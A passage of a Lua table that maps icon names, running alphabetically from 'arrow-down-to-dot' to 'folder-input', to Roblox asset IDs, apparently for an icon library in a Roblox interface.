	["arrow-down-to-dot"] = "rbxassetid://101675355931221",
	["arrow-down-to-line"] = "rbxassetid://87050478931254",
	["arrow-down-up"] = "rbxassetid://85780258549577",
	["arrow-down-wide-narrow"] = "rbxassetid://88461733425991",
	["arrow-down-z-a"] = "rbxassetid://76115279362232",
	["arrow-down"] = "rbxassetid://98764963621439",
	["arrow-left-from-line"] = "rbxassetid://87857914437603",
	["arrow-left-right"] = "rbxassetid://131324733048447",
	["arrow-left-to-line"] = "rbxassetid://118645136026970",
	["arrow-left"] = "rbxassetid://102531941843733",
	["arrow-right-from-line"] = "rbxassetid://74073639809355",
	["arrow-right-left"] = "rbxassetid://77015754304300",
	["arrow-right-to-line"] = "rbxassetid://78632510329852",
	["arrow-right"] = "rbxassetid://113692007244654",
	["arrow-up-0-1"] = "rbxassetid://105257823943016",
	["arrow-up-1-0"] = "rbxassetid://134175521693798",
	["arrow-up-a-z"] = "rbxassetid://77763416595160",
	["arrow-up-down"] = "rbxassetid://81019887641527",
	["arrow-up-from-dot"] = "rbxassetid://124408496673275",
	["arrow-up-from-line"] = "rbxassetid://95777664626453",
	["arrow-up-left"] = "rbxassetid://123490598231261",
	["arrow-up-narrow-wide"] = "rbxassetid://73006024672636",
	["arrow-up-right"] = "rbxassetid://129280608535523",
	["arrow-up-to-line"] = "rbxassetid://108818207813537",
	["arrow-up-wide-narrow"] = "rbxassetid://87437426951568",
	["arrow-up-z-a"] = "rbxassetid://107546173611884",
	["arrow-up"] = "rbxassetid://89282378235317",
	["arrows-up-from-line"] = "rbxassetid://133710016938621",
	["asterisk"] = "rbxassetid://88552752106723",
	["at-sign"] = "rbxassetid://79059152889146",
	["atom"] = "rbxassetid://73167696981648",
	["audio-lines"] = "rbxassetid://70930641819242",
	["audio-waveform"] = "rbxassetid://86462036665209",
	["award"] = "rbxassetid://132740088158419",
	["axe"] = "rbxassetid://132405197863294",
	["axis-3d"] = "rbxassetid://122438676546804",
	["baby"] = "rbxassetid://93472926933440",
	["backpack"] = "rbxassetid://140420225386018",
	["badge-alert"] = "rbxassetid://101829200081951",
	["badge-cent"] = "rbxassetid://133345018873154",
	["badge-check"] = "rbxassetid://76078495178149",
	["badge-dollar-sign"] = "rbxassetid://127139803581141",
	["badge-euro"] = "rbxassetid://120016477674659",
	["badge-indian-rupee"] = "rbxassetid://75659682309981",
	["badge-info"] = "rbxassetid://131995373201472",
	["badge-japanese-yen"] = "rbxassetid://99081574588615",
	["badge-minus"] = "rbxassetid://140321561183881",
	["badge-percent"] = "rbxassetid://121359224294885",
	["badge-plus"] = "rbxassetid://100325578561866",
	["badge-pound-sterling"] = "rbxassetid://119688217279444",
	["badge-question-mark"] = "rbxassetid://121464963737502",
	["badge-russian-ruble"] = "rbxassetid://108839463659864",
	["badge-swiss-franc"] = "rbxassetid://91447608372740",
	["badge-turkish-lira"] = "rbxassetid://137839965873529",
	["badge-x"] = "rbxassetid://122931434733842",
	["badge"] = "rbxassetid://116620312917084",
	["baggage-claim"] = "rbxassetid://86922213051957",
	["ban"] = "rbxassetid://90767043015246",
	["banana"] = "rbxassetid://140713420056179",
	["bandage"] = "rbxassetid://129660129590770",
	["banknote-arrow-down"] = "rbxassetid://139366449345199",
	["banknote-arrow-up"] = "rbxassetid://133758343082529",
	["banknote-x"] = "rbxassetid://95348701438065",
	["banknote"] = "rbxassetid://104840231536668",
	["barcode"] = "rbxassetid://118473018143689",
	["barrel"] = "rbxassetid://130647115622774",
	["baseline"] = "rbxassetid://124677132511270",
	["bath"] = "rbxassetid://76031400297942",
	["battery-charging"] = "rbxassetid://80139357470047",
	["battery-full"] = "rbxassetid://70906718268972",
	["battery-low"] = "rbxassetid://139659256984314",
	["battery-medium"] = "rbxassetid://105934079398915",
	["battery-plus"] = "rbxassetid://91931341486966",
	["battery-warning"] = "rbxassetid://115230083817257",
	["battery"] = "rbxassetid://70765800346189",
	["beaker"] = "rbxassetid://80902539995520",
	["bean-off"] = "rbxassetid://98164436608714",
	["bean"] = "rbxassetid://89491967076869",
	["bed-double"] = "rbxassetid://73820193212911",
	["bed-single"] = "rbxassetid://113423940880634",
	["bed"] = "rbxassetid://97726529032925",
	["beef"] = "rbxassetid://105850162318915",
	["beer-off"] = "rbxassetid://120333134736361",
	["beer"] = "rbxassetid://116404978807744",
	["bell-dot"] = "rbxassetid://93161277118810",
	["bell-electric"] = "rbxassetid://100277767266983",
	["bell-minus"] = "rbxassetid://126334890449727",
	["bell-off"] = "rbxassetid://78560046118930",
	["bell-plus"] = "rbxassetid://77014333795836",
	["bell-ring"] = "rbxassetid://94612128913941",
	["bell"] = "rbxassetid://97392696311902",
	["between-horizontal-end"] = "rbxassetid://81602774794322",
	["between-horizontal-start"] = "rbxassetid://76112384929846",
	["between-vertical-end"] = "rbxassetid://72817612571631",
	["between-vertical-start"] = "rbxassetid://85278312190301",
	["biceps-flexed"] = "rbxassetid://82004462003936",
	["bike"] = "rbxassetid://102930322246035",
	["binary"] = "rbxassetid://91751953950088",
	["binoculars"] = "rbxassetid://101460003267896",
	["biohazard"] = "rbxassetid://95956532900432",
	["bird"] = "rbxassetid://132284145117371",
	["birdhouse"] = "rbxassetid://83999157401433",
	["bitcoin"] = "rbxassetid://95459240442938",
	["blend"] = "rbxassetid://111679612185257",
	["blinds"] = "rbxassetid://71164165283925",
	["blocks"] = "rbxassetid://72212693357737",
	["bluetooth-connected"] = "rbxassetid://96315134002985",
	["bluetooth-off"] = "rbxassetid://80600044218117",
	["bluetooth-searching"] = "rbxassetid://100673019606426",
	["bluetooth"] = "rbxassetid://90506573139443",
	["bold"] = "rbxassetid://116141470019166",
	["bolt"] = "rbxassetid://102881251417484",
	["bomb"] = "rbxassetid://139223800924636",
	["bone"] = "rbxassetid://111242153474115",
	["book-a"] = "rbxassetid://104067275658465",
	["book-alert"] = "rbxassetid://124159928044853",
	["book-audio"] = "rbxassetid://109208148317037",
	["book-check"] = "rbxassetid://115999656081696",
	["book-copy"] = "rbxassetid://108543407492005",
	["book-dashed"] = "rbxassetid://127430784795958",
	["book-down"] = "rbxassetid://101011730128222",
	["book-headphones"] = "rbxassetid://108670200799574",
	["book-heart"] = "rbxassetid://112788845135284",
	["book-image"] = "rbxassetid://80808285757226",
	["book-key"] = "rbxassetid://116024426170705",
	["book-lock"] = "rbxassetid://118765061220571",
	["book-marked"] = "rbxassetid://73211024251780",
	["book-minus"] = "rbxassetid://112724962046282",
	["book-open-check"] = "rbxassetid://130848362492667",
	["book-open-text"] = "rbxassetid://100629528672195",
	["book-open"] = "rbxassetid://129845326810392",
	["book-plus"] = "rbxassetid://140267785051233",
	["book-text"] = "rbxassetid://94011772484232",
	["book-type"] = "rbxassetid://97817304725443",
	["book-up-2"] = "rbxassetid://130161620853665",
	["book-up"] = "rbxassetid://98640174079190",
	["book-user"] = "rbxassetid://128489189240523",
	["book-x"] = "rbxassetid://118754548186537",
	["book"] = "rbxassetid://125383279695672",
	["bookmark-check"] = "rbxassetid://93940443347986",
	["bookmark-minus"] = "rbxassetid://96807096039910",
	["bookmark-plus"] = "rbxassetid://121469724491615",
	["bookmark-x"] = "rbxassetid://112272342584706",
	["bookmark"] = "rbxassetid://121093149326239",
	["boom-box"] = "rbxassetid://99901322535868",
	["bot-message-square"] = "rbxassetid://96145330292478",
	["bot-off"] = "rbxassetid://140417690560013",
	["bot"] = "rbxassetid://80451686744860",
	["bottle-wine"] = "rbxassetid://131675403196921",
	["bow-arrow"] = "rbxassetid://124089655150375",
	["box"] = "rbxassetid://101768155599700",
	["boxes"] = "rbxassetid://136372617578355",
	["braces"] = "rbxassetid://117761094704041",
	["brackets"] = "rbxassetid://74368995728099",
	["brain-circuit"] = "rbxassetid://70547962410202",
	["brain-cog"] = "rbxassetid://132039205501538",
	["brain"] = "rbxassetid://92424107303177",
	["brick-wall-fire"] = "rbxassetid://92980588705520",
	["brick-wall-shield"] = "rbxassetid://75954432775071",
	["brick-wall"] = "rbxassetid://112878522258821",
	["briefcase-business"] = "rbxassetid://129135125207283",
	["briefcase-conveyor-belt"] = "rbxassetid://108665725653714",
	["briefcase-medical"] = "rbxassetid://119917756334087",
	["briefcase"] = "rbxassetid://96754188164225",
	["bring-to-front"] = "rbxassetid://132975903553748",
	["brush-cleaning"] = "rbxassetid://71728977448805",
	["brush"] = "rbxassetid://127035535799640",
	["bubbles"] = "rbxassetid://106183424168227",
	["bug-off"] = "rbxassetid://88020025049245",
	["bug-play"] = "rbxassetid://80107955888092",
	["bug"] = "rbxassetid://83626408925438",
	["building-2"] = "rbxassetid://77873775611951",
	["building"] = "rbxassetid://110616258983082",
	["bus-front"] = "rbxassetid://89863432456045",
	["bus"] = "rbxassetid://133798469717463",
	["cable-car"] = "rbxassetid://128643682205596",
	["cable"] = "rbxassetid://128449944504901",
	["cake-slice"] = "rbxassetid://136769828413242",
	["cake"] = "rbxassetid://103131590503275",
	["calculator"] = "rbxassetid://74915716529646",
	["calendar-1"] = "rbxassetid://98458364171044",
	["calendar-arrow-down"] = "rbxassetid://108415736543437",
	["calendar-arrow-up"] = "rbxassetid://70574654109118",
	["calendar-check-2"] = "rbxassetid://120231170248276",
	["calendar-check"] = "rbxassetid://71551019465748",
	["calendar-clock"] = "rbxassetid://119132152594595",
	["calendar-cog"] = "rbxassetid://122402172360287",
	["calendar-days"] = "rbxassetid://99072017568595",
	["calendar-fold"] = "rbxassetid://117368871270394",
	["calendar-heart"] = "rbxassetid://88839008103676",
	["calendar-minus-2"] = "rbxassetid://98846170279891",
	["calendar-minus"] = "rbxassetid://137354318924383",
	["calendar-off"] = "rbxassetid://109726151749217",
	["calendar-plus-2"] = "rbxassetid://112264562093883",
	["calendar-plus"] = "rbxassetid://125266115249843",
	["calendar-range"] = "rbxassetid://103641849247576",
	["calendar-search"] = "rbxassetid://92010083223634",
	["calendar-sync"] = "rbxassetid://78082218499697",
	["calendar-x-2"] = "rbxassetid://107518051061147",
	["calendar-x"] = "rbxassetid://106703374806500",
	["calendar"] = "rbxassetid://114792700814035",
	["camera-off"] = "rbxassetid://81057636835256",
	["camera"] = "rbxassetid://79950339943067",
	["candy-cane"] = "rbxassetid://71689468772492",
	["candy-off"] = "rbxassetid://110232752314832",
	["candy"] = "rbxassetid://107812129154678",
	["cannabis"] = "rbxassetid://98792006538601",
	["captions-off"] = "rbxassetid://105223545364193",
	["captions"] = "rbxassetid://104960225031445",
	["car-front"] = "rbxassetid://87380942739063",
	["car-taxi-front"] = "rbxassetid://122455403384057",
	["car"] = "rbxassetid://121065933462582",
	["caravan"] = "rbxassetid://120070979471783",
	["card-sim"] = "rbxassetid://134490550095771",
	["carrot"] = "rbxassetid://119118221444304",
	["case-lower"] = "rbxassetid://129303130603241",
	["case-sensitive"] = "rbxassetid://125410273293056",
	["case-upper"] = "rbxassetid://111633433531325",
	["cassette-tape"] = "rbxassetid://137065788934157",
	["cast"] = "rbxassetid://98202245922071",
	["castle"] = "rbxassetid://119275077187784",
	["cat"] = "rbxassetid://124252153404931",
	["cctv"] = "rbxassetid://99979894766624",
	["chart-area"] = "rbxassetid://123446436762366",
	["chart-bar-big"] = "rbxassetid://72336824986044",
	["chart-bar-decreasing"] = "rbxassetid://107217459044963",
	["chart-bar-increasing"] = "rbxassetid://88268905998571",
	["chart-bar-stacked"] = "rbxassetid://98478751113024",
	["chart-bar"] = "rbxassetid://105389816384108",
	["chart-candlestick"] = "rbxassetid://125676898615697",
	["chart-column-big"] = "rbxassetid://98598733210787",
	["chart-column-decreasing"] = "rbxassetid://73586137373563",
	["chart-column-increasing"] = "rbxassetid://120421615068601",
	["chart-column-stacked"] = "rbxassetid://86031449675105",
	["chart-column"] = "rbxassetid://97915995538580",
	["chart-gantt"] = "rbxassetid://88811660555940",
	["chart-line"] = "rbxassetid://101833156055618",
	["chart-network"] = "rbxassetid://104027882693561",
	["chart-no-axes-column-decreasing"] = "rbxassetid://123371717192542",
	["chart-no-axes-column-increasing"] = "rbxassetid://140383830943049",
	["chart-no-axes-column"] = "rbxassetid://94078751170351",
	["chart-no-axes-combined"] = "rbxassetid://121424233161912",
	["chart-no-axes-gantt"] = "rbxassetid://131936541106368",
	["chart-pie"] = "rbxassetid://113412261630136",
	["chart-scatter"] = "rbxassetid://108217585014571",
	["chart-spline"] = "rbxassetid://90307460742494",
	["check-check"] = "rbxassetid://95183312173858",
	["check-line"] = "rbxassetid://115122343485290",
	["check"] = "rbxassetid://93898873302694",
	["chef-hat"] = "rbxassetid://121744015002573",
	["cherry"] = "rbxassetid://139519182403183",
	["chess-bishop"] = "rbxassetid://121701705580238",
	["chess-king"] = "rbxassetid://90885687223462",
	["chess-knight"] = "rbxassetid://96467707042169",
	["chess-pawn"] = "rbxassetid://111318574652751",
	["chess-queen"] = "rbxassetid://98304702099749",
	["chess-rook"] = "rbxassetid://76223925830262",
	["chevron-down"] = "rbxassetid://134243273101015",
	["chevron-first"] = "rbxassetid://105243363790238",
	["chevron-last"] = "rbxassetid://89268452603731",
	["chevron-left"] = "rbxassetid://73780377692148",
	["chevron-right"] = "rbxassetid://92473583511724",
	["chevron-up"] = "rbxassetid://122444883127455",
	["chevrons-down-up"] = "rbxassetid://139404716013205",
	["chevrons-down"] = "rbxassetid://100524612205956",
	["chevrons-left-right-ellipsis"] = "rbxassetid://125035817741526",
	["chevrons-left-right"] = "rbxassetid://87910685945204",
	["chevrons-left"] = "rbxassetid://82617201744347",
	["chevrons-right-left"] = "rbxassetid://87149546686569",
	["chevrons-right"] = "rbxassetid://139121276490483",
	["chevrons-up-down"] = "rbxassetid://131833120209646",
	["chevrons-up"] = "rbxassetid://100467452364672",
	["chromium"] = "rbxassetid://128165143739006",
	["church"] = "rbxassetid://113714744350666",
	["cigarette-off"] = "rbxassetid://77797883078452",
	["circle-alert"] = "rbxassetid://83898160590116",
	["circle-arrow-down"] = "rbxassetid://95901860261344",
	["circle-arrow-left"] = "rbxassetid://102148876968988",
	["circle-arrow-out-down-left"] = "rbxassetid://140598097856694",
	["circle-arrow-out-down-right"] = "rbxassetid://119952801379305",
	["circle-arrow-out-up-left"] = "rbxassetid://132858212688303",
	["circle-arrow-out-up-right"] = "rbxassetid://81783743753173",
	["circle-arrow-right"] = "rbxassetid://70786767999559",
	["circle-arrow-up"] = "rbxassetid://84395128546494",
	["circle-check-big"] = "rbxassetid://93202927221730",
	["circle-check"] = "rbxassetid://85262178816537",
	["circle-chevron-down"] = "rbxassetid://137069490345718",
	["circle-chevron-left"] = "rbxassetid://130250009740827",
	["circle-chevron-right"] = "rbxassetid://125943696958495",
	["circle-chevron-up"] = "rbxassetid://111223574026321",
	["circle-dashed"] = "rbxassetid://126799443883746",
	["circle-divide"] = "rbxassetid://106398997754208",
	["circle-dollar-sign"] = "rbxassetid://91106238890387",
	["circle-dot-dashed"] = "rbxassetid://111451232827180",
	["circle-dot"] = "rbxassetid://82947033619201",
	["circle-ellipsis"] = "rbxassetid://91687150884779",
	["circle-equal"] = "rbxassetid://95133963751438",
	["circle-fading-arrow-up"] = "rbxassetid://104648212910336",
	["circle-fading-plus"] = "rbxassetid://91847890443490",
	["circle-gauge"] = "rbxassetid://108157549473765",
	["circle-minus"] = "rbxassetid://133556159576809",
	["circle-off"] = "rbxassetid://97923456918886",
	["circle-parking-off"] = "rbxassetid://128369410981252",
	["circle-parking"] = "rbxassetid://124034962915196",
	["circle-pause"] = "rbxassetid://139337739700879",
	["circle-percent"] = "rbxassetid://133311912860256",
	["circle-play"] = "rbxassetid://120408917249739",
	["circle-plus"] = "rbxassetid://113157136350384",
	["circle-pound-sterling"] = "rbxassetid://105476153083828",
	["circle-power"] = "rbxassetid://140676030155098",
	["circle-question-mark"] = "rbxassetid://97516698664325",
	["circle-slash-2"] = "rbxassetid://136766902186549",
	["circle-slash"] = "rbxassetid://125206439913049",
	["circle-small"] = "rbxassetid://73685402843600",
	["circle-star"] = "rbxassetid://120318414957104",
	["circle-stop"] = "rbxassetid://87400503942659",
	["circle-user-round"] = "rbxassetid://95489465399880",
	["circle-user"] = "rbxassetid://136220511671311",
	["circle-x"] = "rbxassetid://76821953846248",
	["circle"] = "rbxassetid://130359823580534",
	["circuit-board"] = "rbxassetid://107695264369312",
	["citrus"] = "rbxassetid://139018222976433",
	["clapperboard"] = "rbxassetid://132660667070200",
	["clipboard-check"] = "rbxassetid://92649798577170",
	["clipboard-clock"] = "rbxassetid://123957515687745",
	["clipboard-copy"] = "rbxassetid://125851897718493",
	["clipboard-list"] = "rbxassetid://96460215958908",
	["clipboard-minus"] = "rbxassetid://107968008485671",
	["clipboard-paste"] = "rbxassetid://74382068849983",
	["clipboard-pen-line"] = "rbxassetid://77711589791615",
	["clipboard-pen"] = "rbxassetid://75290966822953",
	["clipboard-plus"] = "rbxassetid://134285318675662",
	["clipboard-type"] = "rbxassetid://89949374318028",
	["clipboard-x"] = "rbxassetid://102222456890103",
	["clipboard"] = "rbxassetid://89601995828423",
	["clock-1"] = "rbxassetid://129363225422045",
	["clock-10"] = "rbxassetid://104332695855541",
	["clock-11"] = "rbxassetid://119023205186105",
	["clock-12"] = "rbxassetid://117789618723068",
	["clock-2"] = "rbxassetid://134710777209413",
	["clock-3"] = "rbxassetid://136385631189327",
	["clock-4"] = "rbxassetid://121808839832144",
	["clock-5"] = "rbxassetid://85082019959457",
	["clock-6"] = "rbxassetid://71009733505593",
	["clock-7"] = "rbxassetid://103111188546225",
	["clock-8"] = "rbxassetid://110059272125337",
	["clock-9"] = "rbxassetid://77610027126437",
	["clock-alert"] = "rbxassetid://97157344465162",
	["clock-arrow-down"] = "rbxassetid://92349314416042",
	["clock-arrow-up"] = "rbxassetid://111484286332629",
	["clock-check"] = "rbxassetid://85231630218857",
	["clock-fading"] = "rbxassetid://93205297285245",
	["clock-plus"] = "rbxassetid://93367709263150",
	["clock"] = "rbxassetid://121808839832144",
	["closed-caption"] = "rbxassetid://99832644030788",
	["cloud-alert"] = "rbxassetid://91967273658626",
	["cloud-check"] = "rbxassetid://97318598202432",
	["cloud-cog"] = "rbxassetid://96497764065749",
	["cloud-download"] = "rbxassetid://121435581993566",
	["cloud-drizzle"] = "rbxassetid://139525315752605",
	["cloud-fog"] = "rbxassetid://76650233148776",
	["cloud-hail"] = "rbxassetid://72320462748242",
	["cloud-lightning"] = "rbxassetid://133517088924849",
	["cloud-moon-rain"] = "rbxassetid://127667837827018",
	["cloud-moon"] = "rbxassetid://71938114737914",
	["cloud-off"] = "rbxassetid://131907154501444",
	["cloud-rain-wind"] = "rbxassetid://107414583736721",
	["cloud-rain"] = "rbxassetid://105547081967408",
	["cloud-snow"] = "rbxassetid://72307126270226",
	["cloud-sun-rain"] = "rbxassetid://99041604425705",
	["cloud-sun"] = "rbxassetid://86114208148727",
	["cloud-upload"] = "rbxassetid://93307473217005",
	["cloud"] = "rbxassetid://121226497050352",
	["cloudy"] = "rbxassetid://105360479023346",
	["clover"] = "rbxassetid://74925550436750",
	["club"] = "rbxassetid://108490365816628",
	["code-xml"] = "rbxassetid://130150477351734",
	["code"] = "rbxassetid://107380207681249",
	["codepen"] = "rbxassetid://135643965971885",
	["codesandbox"] = "rbxassetid://106911852964823",
	["coffee"] = "rbxassetid://106864403231093",
	["cog"] = "rbxassetid://116544501716299",
	["coins"] = "rbxassetid://116510979641930",
	["columns-2"] = "rbxassetid://113004100221850",
	["columns-3-cog"] = "rbxassetid://121589691981064",
	["columns-3"] = "rbxassetid://115223357399375",
	["columns-4"] = "rbxassetid://130807991968419",
	["combine"] = "rbxassetid://79908476334048",
	["command"] = "rbxassetid://93648221906330",
	["compass"] = "rbxassetid://115123411028382",
	["component"] = "rbxassetid://110027788875080",
	["computer"] = "rbxassetid://77480056459407",
	["concierge-bell"] = "rbxassetid://140384259310436",
	["cone"] = "rbxassetid://97759550688437",
	["construction"] = "rbxassetid://106539489968173",
	["contact-round"] = "rbxassetid://71907624112229",
	["contact"] = "rbxassetid://75868297719012",
	["container"] = "rbxassetid://91507237573499",
	["contrast"] = "rbxassetid://112796643981497",
	["cookie"] = "rbxassetid://73159504540002",
	["cooking-pot"] = "rbxassetid://94959783129799",
	["copy-check"] = "rbxassetid://91177247988892",
	["copy-minus"] = "rbxassetid://109524509933035",
	["copy-plus"] = "rbxassetid://113618379616952",
	["copy-slash"] = "rbxassetid://93805787810390",
	["copy-x"] = "rbxassetid://106557557978061",
	["copy"] = "rbxassetid://78979572434545",
	["copyleft"] = "rbxassetid://78559055698593",
	["copyright"] = "rbxassetid://129433635747111",
	["corner-down-left"] = "rbxassetid://90473561177832",
	["corner-down-right"] = "rbxassetid://86512767702085",
	["corner-left-down"] = "rbxassetid://139876989150630",
	["corner-left-up"] = "rbxassetid://126228268096099",
	["corner-right-down"] = "rbxassetid://89237035551302",
	["corner-right-up"] = "rbxassetid://112851237026705",
	["corner-up-left"] = "rbxassetid://84669279763024",
	["corner-up-right"] = "rbxassetid://115099889693145",
	["cpu"] = "rbxassetid://77549309870247",
	["creative-commons"] = "rbxassetid://90408210735312",
	["credit-card"] = "rbxassetid://99163352872346",
	["croissant"] = "rbxassetid://130710485559420",
	["crop"] = "rbxassetid://116344601101413",
	["cross"] = "rbxassetid://101833377863588",
	["crosshair"] = "rbxassetid://134242818164054",
	["crown"] = "rbxassetid://127843403295538",
	["cuboid"] = "rbxassetid://75618807946111",
	["cup-soda"] = "rbxassetid://121098640829562",
	["currency"] = "rbxassetid://90551250119972",
	["cylinder"] = "rbxassetid://90569677179169",
	["dam"] = "rbxassetid://76874486231393",
	["database-backup"] = "rbxassetid://103403210984699",
	["database-zap"] = "rbxassetid://131199921258418",
	["database"] = "rbxassetid://126791525623846",
	["decimals-arrow-left"] = "rbxassetid://120198500638749",
	["decimals-arrow-right"] = "rbxassetid://118263047146797",
	["delete"] = "rbxassetid://126279426372342",
	["dessert"] = "rbxassetid://71508133278830",
	["diameter"] = "rbxassetid://97429051503783",
	["diamond-minus"] = "rbxassetid://128989071438290",
	["diamond-percent"] = "rbxassetid://107717860105959",
	["diamond-plus"] = "rbxassetid://134701163723675",
	["diamond"] = "rbxassetid://105846996304890",
	["dice-1"] = "rbxassetid://112650149591038",
	["dice-2"] = "rbxassetid://112278274566793",
	["dice-3"] = "rbxassetid://118526270626312",
	["dice-4"] = "rbxassetid://113365650364004",
	["dice-5"] = "rbxassetid://72768312430593",
	["dice-6"] = "rbxassetid://85376239182543",
	["dices"] = "rbxassetid://81268120302865",
	["diff"] = "rbxassetid://135052708609715",
	["disc-2"] = "rbxassetid://91419420404185",
	["disc-3"] = "rbxassetid://135470554736048",
	["disc-album"] = "rbxassetid://74693460404344",
	["disc"] = "rbxassetid://101908120120777",
	["divide"] = "rbxassetid://136678191878278",
	["dna-off"] = "rbxassetid://89612426361540",
	["dna"] = "rbxassetid://74007982981741",
	["dock"] = "rbxassetid://121997427160252",
	["dog"] = "rbxassetid://71920105558570",
	["dollar-sign"] = "rbxassetid://127320961224019",
	["donut"] = "rbxassetid://72204922742657",
	["door-closed-locked"] = "rbxassetid://74027613267551",
	["door-closed"] = "rbxassetid://136249099949073",
	["door-open"] = "rbxassetid://91306356501736",
	["dot"] = "rbxassetid://137321056643916",
	["download"] = "rbxassetid://134814648082393",
	["drafting-compass"] = "rbxassetid://99701976182841",
	["drama"] = "rbxassetid://110297795801577",
	["dribbble"] = "rbxassetid://80231809663849",
	["drill"] = "rbxassetid://108644821412796",
	["drone"] = "rbxassetid://117299095794783",
	["droplet-off"] = "rbxassetid://119365002225172",
	["droplet"] = "rbxassetid://100597455015098",
	["droplets"] = "rbxassetid://140111846025180",
	["drum"] = "rbxassetid://136979060344890",
	["drumstick"] = "rbxassetid://104662462521709",
	["dumbbell"] = "rbxassetid://80277236776212",
	["ear-off"] = "rbxassetid://87421916192807",
	["ear"] = "rbxassetid://121894949934209",
	["earth-lock"] = "rbxassetid://88814147073745",
	["earth"] = "rbxassetid://76231597751076",
	["eclipse"] = "rbxassetid://114829622118222",
	["egg-fried"] = "rbxassetid://90622538210545",
	["egg-off"] = "rbxassetid://92288321309285",
	["egg"] = "rbxassetid://117851493400222",
	["ellipsis-vertical"] = "rbxassetid://117978708573781",
	["ellipsis"] = "rbxassetid://140019550645825",
	["equal-approximately"] = "rbxassetid://105382689698323",
	["equal-not"] = "rbxassetid://76864449458032",
	["equal"] = "rbxassetid://123467780715624",
	["eraser"] = "rbxassetid://133957773112410",
	["ethernet-port"] = "rbxassetid://75391715149314",
	["euro"] = "rbxassetid://72229646524456",
	["ev-charger"] = "rbxassetid://97906158859623",
	["expand"] = "rbxassetid://137492887754537",
	["external-link"] = "rbxassetid://129331830773832",
	["eye-closed"] = "rbxassetid://111063268625789",
	["eye-off"] = "rbxassetid://135928786788378",
	["eye"] = "rbxassetid://100033680381365",
	["facebook"] = "rbxassetid://72098528632192",
	["factory"] = "rbxassetid://102170024318039",
	["fan"] = "rbxassetid://78391400440696",
	["fast-forward"] = "rbxassetid://121615540167909",
	["feather"] = "rbxassetid://91872927606406",
	["fence"] = "rbxassetid://123451565578029",
	["ferris-wheel"] = "rbxassetid://79729205796176",
	["figma"] = "rbxassetid://134182122852301",
	["file-archive"] = "rbxassetid://77018106869967",
	["file-axis-3d"] = "rbxassetid://133912328009885",
	["file-badge"] = "rbxassetid://74564895394477",
	["file-box"] = "rbxassetid://119264004071690",
	["file-braces-corner"] = "rbxassetid://77253337986109",
	["file-braces"] = "rbxassetid://95314128621234",
	["file-chart-column-increasing"] = "rbxassetid://134449481172067",
	["file-chart-column"] = "rbxassetid://82048481252560",
	["file-chart-line"] = "rbxassetid://71954360551345",
	["file-chart-pie"] = "rbxassetid://81072193564497",
	["file-check-corner"] = "rbxassetid://76295552859171",
	["file-check"] = "rbxassetid://82604001452455",
	["file-clock"] = "rbxassetid://102325208830990",
	["file-code-corner"] = "rbxassetid://78293841184371",
	["file-code"] = "rbxassetid://130978036895504",
	["file-cog"] = "rbxassetid://101385347151368",
	["file-diff"] = "rbxassetid://96147216772241",
	["file-digit"] = "rbxassetid://89220220354580",
	["file-down"] = "rbxassetid://120650154178290",
	["file-exclamation-point"] = "rbxassetid://102821865889635",
	["file-headphone"] = "rbxassetid://100533735901986",
	["file-heart"] = "rbxassetid://132214916401696",
	["file-image"] = "rbxassetid://123334057511782",
	["file-input"] = "rbxassetid://124728604166044",
	["file-key"] = "rbxassetid://118790255921100",
	["file-lock"] = "rbxassetid://72170228691242",
	["file-minus-corner"] = "rbxassetid://119263271735124",
	["file-minus"] = "rbxassetid://111014798459222",
	["file-music"] = "rbxassetid://134948051536671",
	["file-output"] = "rbxassetid://92146832572911",
	["file-pen-line"] = "rbxassetid://104622936345006",
	["file-pen"] = "rbxassetid://79556179730240",
	["file-play"] = "rbxassetid://89006821567838",
	["file-plus-corner"] = "rbxassetid://76544604043974",
	["file-plus"] = "rbxassetid://78881710800060",
	["file-question-mark"] = "rbxassetid://127617422859576",
	["file-scan"] = "rbxassetid://129480105228213",
	["file-search-corner"] = "rbxassetid://90974165234008",
	["file-search"] = "rbxassetid://97780235974933",
	["file-signal"] = "rbxassetid://122070252538165",
	["file-sliders"] = "rbxassetid://85787771732439",
	["file-spreadsheet"] = "rbxassetid://134501869359270",
	["file-stack"] = "rbxassetid://138929929862605",
	["file-symlink"] = "rbxassetid://91865722036510",
	["file-terminal"] = "rbxassetid://116757454755476",
	["file-text"] = "rbxassetid://90496405707281",
	["file-type-corner"] = "rbxassetid://124902230275209",
	["file-type"] = "rbxassetid://115272552799361",
	["file-up"] = "rbxassetid://131173039312748",
	["file-user"] = "rbxassetid://99552018455009",
	["file-video-camera"] = "rbxassetid://81719056173960",
	["file-volume"] = "rbxassetid://111264764438958",
	["file-x-corner"] = "rbxassetid://87554136773609",
	["file-x"] = "rbxassetid://107333775515154",
	["file"] = "rbxassetid://74748492079329",
	["files"] = "rbxassetid://102806336233202",
	["film"] = "rbxassetid://120978945609706",
	["fingerprint"] = "rbxassetid://112173305232811",
	["fire-extinguisher"] = "rbxassetid://111643493006960",
	["fish-off"] = "rbxassetid://89756724887508",
	["fish-symbol"] = "rbxassetid://118475177681618",
	["fish"] = "rbxassetid://124360663785796",
	["flag-off"] = "rbxassetid://112944528856799",
	["flag-triangle-left"] = "rbxassetid://88045221285272",
	["flag-triangle-right"] = "rbxassetid://108292480304566",
	["flag"] = "rbxassetid://78183383236196",
	["flame-kindling"] = "rbxassetid://139728976917928",
	["flame"] = "rbxassetid://98218034436456",
	["flashlight-off"] = "rbxassetid://79780362871740",
	["flashlight"] = "rbxassetid://100286985600444",
	["flask-conical-off"] = "rbxassetid://112597970025298",
	["flask-conical"] = "rbxassetid://128406680901165",
	["flask-round"] = "rbxassetid://127508287324940",
	["flip-horizontal-2"] = "rbxassetid://103726993598186",
	["flip-horizontal"] = "rbxassetid://122937530107837",
	["flip-vertical-2"] = "rbxassetid://103836358956328",
	["flip-vertical"] = "rbxassetid://108003917346888",
	["flower-2"] = "rbxassetid://72934574245145",
	["flower"] = "rbxassetid://86129438272762",
	["focus"] = "rbxassetid://87493973153317",
	["fold-horizontal"] = "rbxassetid://92835712442240",
	["fold-vertical"] = "rbxassetid://108873727253656",
	["folder-archive"] = "rbxassetid://97312009460206",
	["folder-check"] = "rbxassetid://128492920904557",
	["folder-clock"] = "rbxassetid://111964836738545",
	["folder-closed"] = "rbxassetid://118286209350843",
	["folder-code"] = "rbxassetid://70624096349370",
	["folder-cog"] = "rbxassetid://85299519462846",
	["folder-dot"] = "rbxassetid://138687772725278",
	["folder-down"] = "rbxassetid://118044108459225",
	["folder-git-2"] = "rbxassetid://101394054141166",
	["folder-git"] = "rbxassetid://121885778095158",
	["folder-heart"] = "rbxassetid://79104747211105",
	["folder-input"] = "rbxassetid://90699920697871",
